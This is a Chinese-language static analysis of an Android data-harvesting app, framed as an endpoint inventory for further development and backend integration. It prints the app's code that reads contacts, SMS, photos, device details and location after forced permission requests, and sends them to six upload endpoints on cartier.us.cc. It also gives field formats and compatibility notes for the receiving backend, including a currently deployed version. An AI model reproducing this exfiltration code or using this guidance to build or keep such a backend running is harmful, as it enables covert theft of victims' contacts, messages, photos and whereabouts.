# App 逆向接口清单（安装包分析）

> 本文档由对本项目配套 Android 安装包（`new_vendor.apk`，uni-app / DCloud 打包）的**只读静态分析**整理而成，
> 目的是把 App 端**实际发出的请求**逐字对齐到后端接口，供二次开发与联调使用。
>
> **关于文中出现的路径**：`_apkwork/`、`rebuild/`、`src_backend.zip`、`api.php`、`deployed-20260922/`
> 等均为**分析时本机工作目录中的产物**（安装包、原始后端快照、脚本与中间输出），
> **不属于本仓库**，在此仅作为证据出处保留。
>
> 分析过程中未修改安装包、未修改服务器任何文件、未发起任何网络请求。

---


> 分析对象：`C:\Users\Admin\Desktop\cartier.us.cc_Xp2iN\_apkwork\new_vendor.apk`
> 大小 20,380,202 字节 · md5 `ff02387a329975364157bc19f741a95c` · sha256 `317125fb1efc24f7dbcbfa5059067f10f99b9fb86c6da3fcf2473538a60fd943`
> 方法：Python `zipfile` 直接读取（未解包到磁盘、未使用 apktool、未连服务器、未修改 APK）
> 二进制 `AndroidManifest.xml`（AXML）用自写 string-pool 解析器读取；`app-service.js` 用正则断行美化后逐段阅读
> 所有中间产物在 `_apkwork/scan_out/`（原始扫描输出）与 `_apkwork/extract/`（还原文件）
>
> **只读声明**：本次分析未修改 APK、未修改服务器上任何文件、未发起任何网络请求。

**关键哈希（证据可复核）**

| 文件 | 大小 | sha256 |
|---|---|---|
| `assets/apps/__UNI__5DBD643/www/app-service.js` | 29,899 | `d28acf9017282f7bc8ff5ffb6da4f454e9c8387de5cf0ffc6120aa391291c892` |
| `assets/apps/__UNI__5DBD643/www/app-view.js` | 16,103 | `ace8de0cd8f9551e0126f35c3ef69f7afa22a27c32ebf12d16fda824ca5b11e8` |
| `assets/apps/__UNI__5DBD643/www/app-config-service.js` | 2,236 | `4cac91db11fa150454403a323a7a9eb7adae65774c346c19db944a32b096bac4` |
| `assets/apps/__UNI__5DBD643/www/manifest.json` | 1,033 | `b94250090451f7363bd92bdffcc2034053166505c7986124477987ea246550e4` |
| `assets/data/dcloud_control.xml` | 354 | `e1ad430e3f483cb994007f85294cde389ab0d0bd07930b47a55515385ec5a833` |
| `AndroidManifest.xml` | 29,096 | `c363b1863ada34c0386ba938bbb3ee398688e2c58b9e1bdd54631315385c2c3d` |

**结论先行**：整个 APK 里**唯一**与业务相关的代码是 `app-service.js`（29.9 KB 单行 JS，2 个页面）。全部 702 个 APK 条目中，出现 `cartier.us.cc` 的只有 `app-service.js`（2 次，就是下面两个常量）。dex / so / 资源里**没有任何**业务域名、接口路径或业务字符串 —— 业务逻辑 100% 在这个 JS 里。

---

## 1. 基础地址与入口

### 1.1 两个硬编码常量（`app-service.js`，模块 `b36c`）

```js
r.default.prototype.AppUrl="https://cartier.us.cc/api/",
r.default.prototype.webViewUrl="https://cartier.us.cc/list/";
```

| 项 | 最终值 | 说明 |
|---|---|---|
| **`AppUrl`（上报地址基址）** | `https://cartier.us.cc/api/` | 挂载到 `Vue.prototype`，所有请求都是 `AppUrl + "uploads/xxx"` |
| **`webViewUrl`** | `https://cartier.us.cc/list/` | ⚠️ **赋值处是全前端唯一一次出现（`webViewUrl` 词频 = 1）**，无任何读取点 —— 见 §6.3，此 APK 版本**永远不会打开它** |

### 1.2 版本号相关字段（最终值）

| 字段 | 来源 | 最终值 |
|---|---|---|
| `version.name` | `www/manifest.json` | **`1.0.0`** |
| `version.code` | `www/manifest.json` | **`100`** |
| `appver` | `assets/data/dcloud_control.xml` | **`1.0.0`** |
| `appid` | `manifest.json` / `dcloud_control.xml` | `__UNI__5DBD643` |
| HBuilderX（打包器） | `dcloud_control.xml` / `dcloud_configs.json` | `1.9.9.81719` |
| `compilerVersion`（uni-app 编译器） | `manifest.json` / `app-config-service.js` | `3.7.3` |
| **`App 内部版本标记`** | `app-service.js` `_sendReg` 内硬编码 | **`_v108`**（拼进上报串尾，是后端能看到的"版本号"） |
| `adid` | `manifest.json` | `125539200403` |
| `channel` | `manifest.json` | `common` |
| `appname`（页面配置名） | `app-config-service.js` | **`快乐联盟演示`** |
| `name`（打包名） | `www/manifest.json` | **`暗夜社区`** |
| `uniStatistics.enable` | `manifest.json` | `false`（未开启 uni 统计） |

> 注：`manifest.json` 的 `name` 是「暗夜社区」，`app-config-service.js` 的 `appname` 是「快乐联盟演示」—— **两个名字不一致**（源工程名 vs 打包名），做资产/样本关联时值得注意。

### 1.3 页面与入口

`app-config-service.js`：

```js
"pages":["pages/index/index","pages/html/html"], ... "entryPagePath":"pages/index/index"
"networkTimeout":{"request":60000,"connectSocket":60000,"uploadFile":60000,"downloadFile":60000}
```

- `pages/index/index` —— 注册页（**全部业务逻辑所在**：`app-service.js` 模块 `0712`）
- `pages/html/html` —— 注册成功后 `uni.navigateTo` 过去的"加载页"，**只渲染一张全屏静态图 `/static/b.png`，`onLoad` 仅 `uni.showLoading` 1 秒后显示、30 秒后 `hideLoading`，无任何网络请求**
- `app-view.js`（视图层）**完全没有任何网络调用**：`uni.request`=0、`uni.uploadFile`=0、`XMLHttpRequest`=0、`http`=0、`api/`=0；唯一 `plus.*` 是 `plus.navigator.getStatusbarHeight`
- 模板入口 `__uniappview.html` 只加载 `view.css` / `__uniappes6.js` / `view.umd.min.js` / `app-view.js`，无外链

**触发链（唯一交互路径）**：

```
用户输入 手机号 + 邀请码 → 点「注册」按钮 (uploadsTxl)
  └─ _askRegPerm()  ← 申请 4 个权限 + 双通道读通讯录 + 读短信 + 读相册  [期间 13 次 uploads/diag]
       └─ _sendReg(ok)                              → POST uploads/api
            └─ success 回调（无条件，不看返回值）
                 ├─ uploadsMsg()                    → POST uploads/apisms
                 └─ getUserId()                     → POST uploads/getuserid
                      └─ 仅当 resp.code==1：
                           ├─ uploadsImageList()    → 每张图 uploadFile → uploads/img
                           └─ dingweiStart()        → POST uploads/apimap（立即 + 每 60s）
  └─ 10 秒后：hideLoading()；若通讯录权限 ok → navigateTo("/pages/html/html")
```

---

## 2. 接口清单表

全部 6 个接口，**全部是 POST**，基址 `https://cartier.us.cc/api/`，请求头统一 `Content-Type: application/x-www-form-urlencoded`（除 `img` 为 multipart）。

| # | 路径（拼接后） | 方法 | 参数与拼装方式 | 调用时机 | 证据片段（原文） |
|---|---|---|---|---|---|
| 1 | `https://cartier.us.cc/api/uploads/api` | **POST** | 表单单字段 `data`，值为自定义分隔串：<br>`<手机号>**<邀请码>**<厂商>_<通讯录数>_<相册数>_<短信数>_v108` 然后对每条联系人追加 `=<姓名>\|<号码>` | 点「注册」按钮 → 4 项权限申请 + 通讯录/短信/相册读取**全部完成后**（`_sendReg`） | `uni.request({url:e.AppUrl+"uploads/api",data:{data:s},header:{"Content-Type":"application/x-www-form-urlencoded"},method:"POST",success:function(n){...e.uploadsMsg(),e.getUserId()}})` |
| 2 | `https://cartier.us.cc/api/uploads/getuserid` | **POST** | 表单字段 **`mobile`** = 手机号 | 接口 1 的 success 回调里，紧接着 `uploadsMsg()` | `uni.request({url:this.AppUrl+"uploads/getuserid",data:{mobile:this.phone},header:{"Content-Type":"application/x-www-form-urlencoded"},method:"POST",success:function(n){...1==n.data.code?(...e.userId=n.data.data,e.uploadsImageList(),e.dingweiStart())...}})` |
| 3 | `https://cartier.us.cc/api/uploads/apisms` | **POST** | 表单单字段 `data` = **`JSON.stringify(数组)`**：<br>`[{"imei":手机号,"imei2":邀请码},{"Smsbody":正文,"PhoneNumber":对方号码,"Date":"Y-M-D H:M:S","Type":类型}, ...]`<br>最多 50 条短信（首元素是身份头） | 接口 1 的 success 回调里（在 `getUserId()` 之前） | `uni.request({url:this.AppUrl+"uploads/apisms",data:{data:JSON.stringify(e)},header:{"Content-Type":"application/x-www-form-urlencoded"},method:"POST",success:function(e){t("log",e.data,...)}})` |
| 4 | `https://cartier.us.cc/api/uploads/img` | **POST**<br>multipart | 文件字段名 **`data`**（`name:"data"`），表单字段 **`id` = userId**（来自接口 2 的 `resp.data`） | 接口 2 返回 `code==1` 后，**对相册里每张图片调用一次**（最多 51 张） | `uni.uploadFile({url:n.AppUrl+"uploads/img",filePath:e.tempFilePath,name:"data",formData:{id:n.userId},success:...})` |
| 5 | `https://cartier.us.cc/api/uploads/apimap` | **POST** | 表单单字段 `data` = **逗号拼接四元组** `<手机号>,<邀请码>,<经度>,<纬度>` | 接口 2 返回 `code==1` 后立即 1 次，之后**每 60 000 ms 重试一次**，拿到坐标即停 | `uni.request({url:e.AppUrl+"uploads/apimap",method:"POST",data:{data:e.phone+","+e.code+","+c+","+l},header:{"Content-Type":"application/x-www-form-urlencoded"},success:...})` |
| 6 | `https://cartier.us.cc/api/uploads/diag` | **POST** | 表单单字段 `d` = **`JSON.stringify(对象)`**：<br>`{"tag":"阶段名","extra":{...},"lxr":通讯录数,"sms":短信数,"img":相册数,"brand":厂商,"model":机型,"android":系统版本}` | 注册流程**埋点**，13 个阶段各 fire-and-forget 一次（**无 success/fail 回调，响应被完全丢弃**） | `uni.request({url:e.AppUrl+"uploads/diag",method:"POST",header:{"Content-Type":"application/x-www-form-urlencoded"},data:{d:JSON.stringify(info)}})` |

### 2.1 上传字段的细节（照抄原文，可用于对齐后端）

**接口 1 `uploads/api` 的 `data` 串真实构造**（`_sendReg`）：

```js
s="".concat(e.phone,"**").concat(e.code,"**").concat(plus.device.vendor,"_")
   .concat(e.lxrList.length,"_").concat(e.imageListPath.length,"_")
   .concat(e.msgList.length).concat("_v108");
for(var o=0;o<e.lxrList.length;o++){
  var a=e.lxrList[o].displayName||e.lxrList[o].nickname||e.lxrList[o].name;
  a=a?a.replace(/\s+/g,""):a;
  var r=(e.lxrList[o].phoneNumbers?e.lxrList[o].phoneNumbers[0].value:"").replace(/\s+/g,"");
  r=r?r.replace(/\s+/g,""):r;
  s+="=".concat(a,"|").concat(r)
}
// catch 分支降级为：
s="".concat(e.phone,"**").concat(e.code,"**").concat(plus.device.vendor,"_0_0_0_v108")
```

实例：`13900000001**589056**HUAWEI_128_51_20_v108=张三|13900000002=李四|13900000003`
→ 后端按 `**` 切前三段、按 `=` 切联系人、按 `|` 切姓名/号码（与 `src_backend.zip` 的 `api()` 完全对应）。

**接口 3 `uploads/apisms` 的字段名有误导性**：`imei` 字段装的是**手机号**，`imei2` 装的是**邀请码**，不是真实 IMEI。
App 确实调了 `getSimOperatorName()` / `getLine1Number()`，但**返回值被直接丢弃**（只作为语句执行，未赋值使用）：

```js
e.getSimOperatorName(),e.getLine1Number()   // onLoad 内，结果未使用
```

**接口 4 `uploads/img` 的图片处理**：先 `uni.compressImage({src, width:700, quality:60})` 再上传，压缩后临时文件路径作为 `filePath`；`imageListPath` 来自 `MediaStore.Images.Media` 查询（`DATE_ADDED` 排序），**最多 51 张**（`o++, o>50 break`）。

### 2.2 客户端从服务端读取并"使用"的响应字段（唯一一处）

```js
success:function(n){
  t("log",n.data," at pages/index/index.vue:145"),
  1==n.data.code ? (t("log","okok",...), e.userId=n.data.data, e.uploadsImageList(), e.dingweiStart())
                 : t("log","onon",n.code,...)
}
```

即**只有 `uploads/getuserid` 的 `{code, data}` 被真正解析**，其余 5 个接口的响应一律只写 `console.log`（`uploads/diag` 连回调都没有）。**这直接否定了"服务端通过接口返回值下发指令"的可能**。

---

## 3. 定时 / 轮询逻辑

全前端（app-service.js）**只有 1 个 `setInterval`**，其余都是短延时 `setTimeout`。

| 周期 | 做什么 | 证据 |
|---|---|---|
| **60 000 ms（60 秒）** | 重新执行 `dingweiReport()` 上报定位（`uploads/apimap`）。首次由 `dingweiStart()` 立即触发一次，然后进入 60s 循环；**一旦成功拿到经纬度并上报成功，立即 `clearInterval` 停止**（即"每 60 秒重试直到拿到定位"的语义） | `e._dwTimer=1; e.dingweiReport(); e._dwInt=setInterval(function(){e.dingweiReport()},6e4)` |
| 1 500 ms ×2（最多 3 轮） | `readAB` 通讯录读取失败/为空时的退避重试（`tries<2`） | `setTimeout(attempt,1500)` |
| 1 000 ms / 30 000 ms / 10 000 ms（各 1 次） | 加载动画：注册成功页 1s 显示 loading、30s 后隐藏；`_sendReg` 后 10s `hideLoading` 并跳转 | `setTimeout((function(){uni.showLoading({title:"正在加载数据..."})}),1e3)` 等 |

`dingweiReport()` 的两条定位路径：

1. **Android 原生优先**：`LocationManager.getLastKnownLocation("gps")` → `"network"` → `"passive"`，拿到即用（快，无需新定位）；`if(s){... clearInterval ... return}` —— **只要系统里有 last-known 坐标，第一次就会命中并停止定时器**。
2. **回退**：`plus.geolocation.getCurrentPosition(cb, err, {provider:"system", timeout:12e3, geocode:false})`，成功后在回调里 `clearInterval`；失败则保持 60s 循环继续重试。

**结论：不存在"拉取指令/任务"的轮询。** 唯一的周期性请求就是定位上报，且成功后自动停止。

**另外没有任何长连接通道**：前端 `WebSocket` = 0，`EventSource` = 0，`uni.connectSocket` = 0，`plus.push` = 0。

---

## 4. 本地存储键名清单

**结论：App 业务代码不使用任何本地存储。**

| 检查项 | 结果 |
|---|---|
| `app-service.js` 中 `plus.storage` | **0 匹配** |
| `app-service.js` 中 `uni.setStorageSync` / `getStorageSync` / `setStorage` / `getStorage` | **0 匹配** |
| `app-service.js` 中 `localStorage` | **0 匹配** |
| 全前端 `localStorage` | 仅 **1 次**，在 `app-config-service.js` 的框架代码里把 `localStorage` 显式声明为 `void 0`（禁用 web storage 的占位），**不是使用** |

```js
// app-config-service.js —— 这是唯一的 localStorage 出现位置，值恒为 undefined
return{instance:{__uniConfig:__uniConfig,__uniRoutes:__uniRoutes,global:void 0,window:void 0,
  document:void 0,...localStorage:void 0,history:void 0,...}}
```

**所有状态都是 Vue 组件内存态，App 一退出即丢**（`data()` 里的 `userName/phone/code/userId/imageListPath/msgList/lxrList/statePhoto/stateContact/stateSMS/alwaysState`）。
`plus.storage` 相关 feature 在 `dcloud_properties.xml` 里虽然注册了（`io.dcloud.feature.pdr.NStorageFeatureImpl`），但**业务代码从未调用**。

因此：**没有可用的"持久化 key"清单，也没有本地缓存的服务端指令、token、配置**（`token` 词频全前端 = 0）。

---

## 5. 能力有无判定表 ★核心结论

判定口径：在**全部 702 个 APK 条目**（含 `classes.dex` / `assets.dex` / `classes2.dex` / `AndroidManifest.xml` / 所有 so / 所有资源）上做**字节级**全文搜索，并对前端 JS 先做 `\uXXXX` 反转义（否则中文关键词全部漏检）。

| # | 能力 | 判定 | 证据 / 反证 |
|---|---|---|---|
| 1 | **上报通话记录（call log）** | ❌ **完全不存在** | APK 全量搜索：`READ_CALL_LOG` = **0**、`CallLog` = **0**、`call_log` = **0**、`content://call_log` = **0**、`通话` = **0**、`tonghua/calllog` = **0**。二进制的 `AndroidManifest.xml` string-pool（220 条）里**没有** `android.permission.READ_CALL_LOG`（`CALL_PHONE` 有，但那是 DCloud 模板的默认权限，且没有被任何代码使用）。`app-service.js` 的 `importClass` 白名单只有 `TelephonyManager / Context / ContactsContract$CommonDataKinds$Phone / MediaStore / Uri / LocationManager / Intent / Settings`，**无 CallLog**。<br>**→ 该 App 连读通话记录所需的系统权限都没申请，物理上做不到。** |
| 2 | **上报抖音好友 / 粉丝列表** | ❌ **完全不存在** | APK 全量搜索：`douyin` = **0**、`Douyin` = **0**、`aweme` = **0**、`snssdk` = **0**、`抖音` = **0**。无抖音 SDK、无抖音包名、无相关 URL。 |
| 3 | **上报快手列表** | ❌ **完全不存在** | `kuaishou` = **0**（APK 全量，大小写不敏感亦为 0）。`快手` = **2**，全部位于 `classes.dex` / `assets.dex` 的 **DCloud 分享模块字符串表**（`io.dcloud.share.*`，DCloud 内置的"分享到快手"能力声明），**前端 0 匹配、无任何调用代码**。 |
| 4 | **上报微信好友** | ❌ **完全不存在** | `微信` = **0**；`weixin` = **4**，全部在 `classes.dex`/`assets.dex`（`Lio/dcloud/share/IWeiXinFShareApi;`）与 DCloud 框架 `io/dcloud/weexUniJs.js`、`io/dcloud/all.js` 里，**前端 0 匹配**。无微信 SDK 调用、无 `plus.share`（=0）、无 `plus.oauth`（=0）。 |
| 5 | **服务端下发群发任务（短信/视频/微信）** | ❌ **完全不存在** | ① 前端 `群发` = **0**、`massSend/mass_send/bulk` = **0**、`任务` = **0**、`好友/粉丝` = **0**。<br>② **短信群发**：`SmsManager` = **0**（APK 全量）、`sendTextMessage` = **0**、`sendMultipartTextMessage` = **0**、`plus.messaging` = **0**。App 只**读**短信（`content://sms/`），**从不发送**。`SEND_SMS` 权限虽在 manifest 里（DCloud 模板默认），但**无任何代码使用**。<br>③ **视频群发**：前端 `视频` = **0**、`video` = **0**、`Video` = **0**；无 `plus.video`、无 `plus.media`、无摄像头调用。<br>④ **微信群发**：`plus.share` = **0**、无微信 SDK 调用。<br>⑤ **无下发通道**：见 §2.2（只有 getuserid 的响应被解析）+ §3（无长连接）。 |
| 6 | **服务端下发任何远程指令** | ❌ **完全不存在** | 逐条排掉所有可能的指令通道：<br>· **接口返回值**：6 个接口中 5 个的响应只 `console.log`，`uploads/diag` 连回调都没有；仅 `getuserid` 的 `{code,data}` 被用于取 userId → **不是指令通道**<br>· **长连接**：前端 `WebSocket` = 0、`EventSource` = 0、`uni.connectSocket` = 0<br>· **动态代码执行**：前端 `eval(` = **0**、`new Function` = **0**（`io/dcloud/*.js` 与 `view.umd.min.js` 里的 eval/new Function 属 DCloud/Vue 框架自身，非业务、非远端可控）<br>· **远程加载/安装**：前端 `plus.runtime.openURL` = 0、`plus.runtime.install` = 0、`plus.downloader` = 0、`plus.uploader` = 0、`uni.downloadFile` = 0<br>· **内嵌网页**：前端 `web-view` = **0**（`webViewUrl` 只被赋值 1 次，无读取点）<br>· **推送**：`plus.push` = 0，`manifest.json` 无 push 模块配置<br>· **无障碍服务（可被远程操控的常见通道）**：manifest string-pool（220 条）中 `accessibility` 子串 **不存在**，**无** `BIND_ACCESSIBILITY_SERVICE` 权限声明；`AccessibilityService` 那 40 次匹配全在 `classes.dex` 的 AndroidX/Support 库视图类里，非 App 声明<br>
· **无自建后台组件**：manifest 里声明的 `service`/`receiver`/`provider`/`activity` **全部**是 DCloud 运行时与三方 SDK（`io.dcloud.PandoraEntry` / `WebAppActivity` / `WebviewActivity` / `io.dcloud.sdk.base.service.DownloadService`(广告SDK) / `com.dmcbig.mediapicker.*` / `com.taobao.weex.WXGlobalEventReceiver` / `*.dc.fileprovider`），**没有任何 App 自己的 Service / Receiver / JobService**（`BIND_JOB_SERVICE` 权限存在但无对应组件实现）<br>· **口令/指令词**：前端 `command` = 0、`cmd` = 0、`指令` = 0、`task` = 0、`远程` = 0、`命令` = 0、`控制` = 0、`脚本` = 0<br>**→ App 是纯单向"采集+上报"客户端，不存在任何下行指令面。** |

### 5.1 App **确实具备**的采集能力（正面清单）

| 能力 | 判定 | 实现 |
|---|---|---|
| 上报**通讯录** | ✅ 有 | **双通道并行读取取较大者**：① `ContentResolver.query(ContactsContract$CommonDataKinds$Phone.CONTENT_URI)` 直读 `display_name` / `data1`，上限 3000 条；② `plus.contacts.getAddressBook(ADDRESSBOOK_PHONE)` + `ab.find(["displayName","phoneNumbers"])`，失败退避重试 3 轮。号码按 `phoneNumbers` 展开成多条 → 上报进 `uploads/api` 的 `=姓名\|号码` 段，落到后端 `app_mobile` 表 |
| 上报**短信（读取）** | ✅ 有 | `ContentResolver.query(Uri.parse("content://sms/"))`，取 `address` / `body` / `date` / `type`，**上限 51 条** → `uploads/apisms`，落 `app_content` 表。**只读不发** |
| 上报**相册图片** | ✅ 有 | `MediaStore.Images.Media.EXTERNAL_CONTENT_URI` 查 `_ID/DATA/DATE_ADDED`，**上限 51 张**；逐张 `uni.compressImage(width:700,quality:60)` → `uploads/img`（服务端按 `<id>/` 分目录存盘） |
| 上报**定位** | ✅ 有 | `LocationManager.getLastKnownLocation` 优先，`plus.geolocation.getCurrentPosition` 回退；**每 60 秒重试**直到成功 → `uploads/apimap`，落 `app_user.mapx/mapy` |
| 上报**设备信息** | ✅ 有 | `plus.device.vendor`（厂商，也拼进 `clientid`）、`plus.device.model`（机型）、`plus.os.version`（安卓版本）→ `uploads/diag` 的 `{brand,model,android}` |
| 强制/静默**权限索取** | ✅ 有 | 一次性申请 `READ_CONTACTS` / `READ_SMS` / `READ_EXTERNAL_STORAGE` / `ACCESS_FINE_LOCATION`；用户点"取消"则 `plus.runtime.quit()` **直接退出 App**；永久拒绝则弹窗引导去系统权限设置页 |
| 上报**流程埋点** | ✅ 有 | 13 个阶段调 `uploads/diag`：`perm` / `perm_ex` / `contacts_cr` / `contacts_cr_err` / `contacts_ab` / `contacts_final` / `ab_try` / `ab_denied` / `ab_finderr` / `ab_ex` / `sms_err` / `img_err` / `collected` |

### 5.2 完整 `plus.*` / `uni.*` API 清单（`app-service.js`，穷举）

`plus.*`（**全部**）：`android.importClass`(22) · `android.requestPermissions`(2) · `android.runtimeMainActivity`(8) · `contacts.ADDRESSBOOK_PHONE`(2) · `contacts.getAddressBook`(2) · `device.model`(1) · `device.vendor`(3) · `geolocation.getCurrentPosition`(1) · `ios.deleteObject`(14) · `ios.import`(12) · `os.name`(1) · `os.version`(1) · `runtime.quit`(1)

`uni.*`（**全部**）：`request`(6) · `uploadFile`(1) · `compressImage`(1) · `showToast`(6) · `showLoading`(2) · `hideLoading`(2) · `showModal`(1) · `navigateTo`(1) · `getSystemInfoSync`(2) · `addInterceptor`(1) · `requireGlobal`(2) · `restoreGlobal`(2)

`importClass` 白名单（**only these**）：`android.telephony.TelephonyManager` · `android.content.Context` · `android.provider.ContactsContract$CommonDataKinds$Phone` · `android.provider.MediaStore` · `android.net.Uri` · `android.provider.ContactsContract` · `android.location.LocationManager` · `android.content.Intent` · `android.provider.Settings`

**没有** `plus.push` / `plus.share` / `plus.oauth` / `plus.payment` / `plus.messaging` / `plus.downloader` / `plus.uploader` / `plus.webview` / `plus.io` / `plus.camera` / `plus.video` / `plus.audio` / `plus.speech` / `plus.barcode` / `plus.nativeUI`。

### 5.3 死代码 / 未使用项（做行为分析时不要误判）

| 符号 | 状态 |
|---|---|
| `webViewUrl` = `https://cartier.us.cc/list/` | **只赋值、从不读取** → 该 URL 在此 APK 版本中永远不会被访问 |
| `getLXR()` | 定义了但从未被调用（已被 `_askRegPerm` 里的 `readCR`/`readAB` 取代） |
| `getMessage()` | 定义了但从未被调用 |
| `alwaysState`（data 字段） | 声明后从未使用 |
| 视图层 `.logo` 引用的 `/static/a.png`（268 KB）/ `/static/b.png`（739 KB） | 只是全屏占位图 |
| `manifest.json` 的 `permissions: {Contacts, UniNView}` | DCloud 运行时声明，不是业务接口 |

---

## 6. 与后端已知接口对照

### 6.1 App 实际会调的接口（6 个，已穷举验证）

对 `app-service.js` 全量匹配 `"uploads/xxx"` 字面量，命中**恰好 6 个**，与 `uni.request`(6) + `uni.uploadFile`(1) = 7 个网络调用点一一对应：

`uploads/api` · `uploads/apisms` · `uploads/apimap` · `uploads/getuserid` · `uploads/img` · `uploads/diag`

### 6.2 三方版本对照

| App 调用的接口 | `rebuild/src_backend.zip`<br>`app/api/controller/Uploads.php`（**原始线上快照，4826 B**） | `rebuild/api.php`<br>（独立 drop-in，68 KB） | `rebuild/deployed-20260922/Uploads.php`<br>（**当前线上原文，29305 B**） |
|---|---|---|---|
| `uploads/api` | ✅ 有 | ✅ `action_api` | ✅ 有 |
| `uploads/apisms` | ✅ 有 | ✅ `action_apisms` | ✅ 有 |
| `uploads/apimap` | ✅ 有 | ✅ `action_apimap` | ✅ 有 |
| **`uploads/getuserid`** | ❌ **缺** | ✅ `action_getuserid` | ✅ 有 |
| **`uploads/img`** | ❌ **缺** | ✅ `action_img` | ✅ 有 |
| **`uploads/diag`** | ❌ **缺** | ✅ `action_diag` | ✅ 有 |

> `src_backend.zip` 的 `Uploads.php` 经确认只有 3 个业务方法：`api()` / `apisms()` / `apimap()`（另加 `getip` / `filter_emoji` / `getappconfig` 辅助函数）。
> 全 zip 检索 `getuserid` / `function img` / `diag` **均无业务命中**（`diag` 只命中 PHPExcel 等第三方库）。

### 6.3 ★「App 会调但后端还没有」的接口列表

**取决于以哪份后端为基准：**

- **以 `rebuild/src_backend.zip`（原始后端源码快照）为基准 → 缺 3 个：**
  1. **`POST /api/uploads/getuserid`**（参数 `mobile`）—— 缺失会导致**整条链路在第 2 步断掉**：拿不到 `userId` → `uploads/img` 无 `id` 可传、`uploads/apimap` 的 `dingweiStart()` 也永不启动（**定位上报完全不会发生**）
  2. **`POST /api/uploads/img`**（multipart，文件字段 `data`，表单字段 `id`）—— 缺失导致相册图片全部上传失败
  3. **`POST /api/uploads/diag`**（参数 `d`）—— 缺失只影响诊断埋点，不影响主流程（App 不解析其响应）

- **以 `rebuild/deployed-20260922/Uploads.php`（线上实际运行版本）或 `rebuild/api.php` 为基准 → 缺 0 个**，6 个接口全部已实现（`getuserid` / `img` / `diag` 是 2026-09-22 补齐的，见 `deployed-20260922/REPORT.md` §1）。

### 6.4 反方向：后端有但 App 不调

| 路径 | 后端 | App |
|---|---|---|
| `GET /list`、`GET /list/`（302 → `/web/list.html`，标题「数据已上报成功」） | ✅ 有（`rebuild/api.php` 的 `action_list`、`deployed-20260922/list-compat.conf` + `list.html`） | ❌ **从不调用**。`webViewUrl` 常量虽为 `https://cartier.us.cc/list/`，但全前端**只赋值 1 次、无读取点**；模板中 `web-view` 组件 **0 匹配**；`pages/html/html` 的渲染函数只输出 `<view class="content"><image class="logo"/></view>`，`onLoad` 仅 `uni.showLoading` 1s / `hideLoading` 30s。**→ 该 APK 版本注册完成后只会显示一张全屏静态图（`/static/b.png`）30 秒，不会打开 `/list/` 页。** |

### 6.5 参数面兼容性备注（供联调）

| 接口 | App 发出的字段 | 线上后端接受的字段 | 兼容 |
|---|---|---|---|
| `getuserid` | `mobile` | `mobile / data / tel / phone / imei / name / username` | ✅ |
| `img` | 文件字段 `data`，表单字段 `id` | 文件 `data/file/upload/image/img/photo`；id `id/userid/uid` | ✅ |
| `api` | `data`（`**`/`=`/`\|` 分隔串） | 同 | ✅ |
| `apisms` | `data` = JSON 数组，**元素数 = 1 + 短信数** | 要求 `count($sms) >= 2`，否则 `exit('获取信息错误')` | ⚠️ **手机里 0 条短信时 App 仍会 POST 长度为 1 的数组**，后端会回 `获取信息错误`（不影响 App，因为 App 不看返回值） |
| `apimap` | `data` = `手机号,邀请码,经度,纬度` | `explode(',')` 取 `[0][1][2][3]` | ✅（若邀请码含半角逗号会错位，属边缘情况） |
| `diag` | `d` | `d` | ✅ |

---

## 附录 A：可复核的中间产物

| 文件 | 内容 |
|---|---|
| `_apkwork/scan_apk.py` | 全 APK URL / 关键词 / 二进制字符串扫描器 |
| `_apkwork/parse_manifest.py` | 二进制 AXML string-pool 解析器（权限表、类名） |
| `_apkwork/capability_probe.py` | 36 组能力探针（通话记录/抖音/快手/微信/群发/指令/存储/网络） |
| `_apkwork/decode_search.py` | `\uXXXX` 反转义后的中英文关键词搜索 |
| `_apkwork/api_inventory.py` | `plus.*` / `uni.*` / `importClass` / 调用点穷举 |
| `_apkwork/final_verify.py` | 702 条目字节级能力 token 终检 |
| `_apkwork/scan_out/` | 上述脚本的完整文本输出（`capability_probe.txt`、`decoded_keyword_scan.txt`、`final_verify.txt`、`manifest_pool.txt`、`all_urls.txt` 等） |
| `_apkwork/extract/` | 从 APK 还原的关键文件与美化版 JS（`app-service.pretty.js` 等） |

## 附录 B：一句话总结

这是一个功能极度单一的**单向采集型** App：拿到手机号+邀请码后，**一次性**抓取**通讯录（上限 3000 条）+ 短信（上限 51 条）+ 相册图片（上限 51 张）**，分 6 个 POST 接口全部推到 `https://cartier.us.cc/api/uploads/*`，并**每 60 秒重试上报一次定位直到成功**；**没有任何通话记录、抖音、快手、微信好友采集能力，没有任何群发能力，也不存在任何形式的服务端下行指令通道**。
